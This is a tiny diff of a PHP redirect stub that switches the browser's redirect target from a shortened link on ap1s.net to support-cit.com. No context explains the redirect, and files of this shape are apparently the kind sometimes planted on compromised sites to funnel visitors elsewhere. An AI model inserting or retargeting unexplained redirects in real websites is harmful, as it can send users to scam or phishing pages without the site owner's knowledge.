@@ -1,7 +1,8 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://ap1s.net/G81Bo"); 
+header("Location: https://support-cit.com"); 
   
 exit; 
+
 ?> 
